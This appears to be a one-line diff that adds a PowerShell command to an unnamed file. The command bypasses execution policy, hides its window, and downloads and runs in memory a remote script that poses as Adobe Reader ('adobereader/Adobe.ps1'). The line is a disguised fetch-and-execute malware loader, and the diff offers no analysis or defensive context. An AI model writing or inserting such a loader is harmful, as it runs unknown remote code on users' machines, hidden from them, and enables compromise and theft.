@@ -1,0 +1,1 @@
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rexonlinerex/adobereader/refs/heads/main/Adobe.ps1')"
